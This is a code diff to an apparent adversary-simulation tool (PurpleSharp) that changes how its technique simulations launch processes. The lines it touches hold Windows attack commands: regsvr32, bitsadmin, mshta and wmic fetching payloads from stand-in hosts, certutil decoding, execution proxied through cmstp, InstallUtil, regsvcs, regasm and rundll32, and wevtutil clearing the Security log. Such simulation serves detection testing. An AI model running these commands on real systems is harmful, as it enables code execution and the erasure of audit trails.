@@ -21,7 +21,7 @@ namespace PurpleSharp.Simulations
             try
             {
                 string file = @"C:\Users\Administrator\AppData\Local\Temp\XKNqbpzl.txt";
-                ExecutionHelper.StartProcess("", String.Format("cmstp /s /ns {0}", file), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("cmstp /s /ns {0}", file), logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
@@ -39,7 +39,7 @@ namespace PurpleSharp.Simulations
             {
                 string url = @"http://malicious.domain:8080/payload.sct";
                 string dll = "scrobj.dll";
-                ExecutionHelper.StartProcess("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -57,7 +57,7 @@ namespace PurpleSharp.Simulations
             try
             {
                 string file = @"C:\Windows\Temp\XKNqbpzl.exe";
-                ExecutionHelper.StartProcess("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U {0}", file), logger);
+                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U {0}", file), logger);
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -74,8 +74,8 @@ namespace PurpleSharp.Simulations
             try
             {
                 string file = @"winword.dll";
-                ExecutionHelper.StartProcess("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U {0}", file), logger);
-                ExecutionHelper.StartProcess("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U {0}", file), logger);
+                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U {0}", file), logger);
+                ExecutionHelper.StartProcessApi("", String.Format(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U {0}", file), logger);
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -94,7 +94,7 @@ namespace PurpleSharp.Simulations
             {
                 string url = "http://web.evil/sc.exe";
                 string file = @"C:\Windows\Temp\winword.exe";
-                ExecutionHelper.StartProcess("", String.Format("bitsadmin /transfer job /download /priority high {0} {1}", url, file), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("bitsadmin /transfer job /download /priority high {0} {1}", url, file), logger);
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -111,7 +111,7 @@ namespace PurpleSharp.Simulations
             try
             {
                 string url = "http://webserver/payload.hta";
-                ExecutionHelper.StartProcess("", String.Format("mshta {0}", url), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("mshta {0}", url), logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
@@ -129,7 +129,7 @@ namespace PurpleSharp.Simulations
             {
                 string encoded = "encodedb64.txt";
                 string decoded = "decoded.exe";
-                ExecutionHelper.StartProcess("", String.Format("certutil -decode {0} {1}", encoded, decoded), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("certutil -decode {0} {1}", encoded, decoded), logger);
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -146,7 +146,7 @@ namespace PurpleSharp.Simulations
             try
             {
                 string url = "http://webserver/payload.xsl";
-                ExecutionHelper.StartProcess("", String.Format("wmic os get /FORMAT:\"{0}\"", url), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("wmic os get /FORMAT:\"{0}\"", url), logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
@@ -163,7 +163,7 @@ namespace PurpleSharp.Simulations
             try
             {
                 string file = @"C:\Windows\twain_64.dll";
-                ExecutionHelper.StartProcess("", String.Format("rundll32 \"{0}\"", file), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("rundll32 \"{0}\"", file), logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
@@ -180,7 +180,7 @@ namespace PurpleSharp.Simulations
             logger.TimestampInfo("Using the command line to execute the technique");
             try
             {
-                ExecutionHelper.StartProcess("", "wevtutil.exe cl Security", logger);
+                ExecutionHelper.StartProcessApi("", "wevtutil.exe cl Security", logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
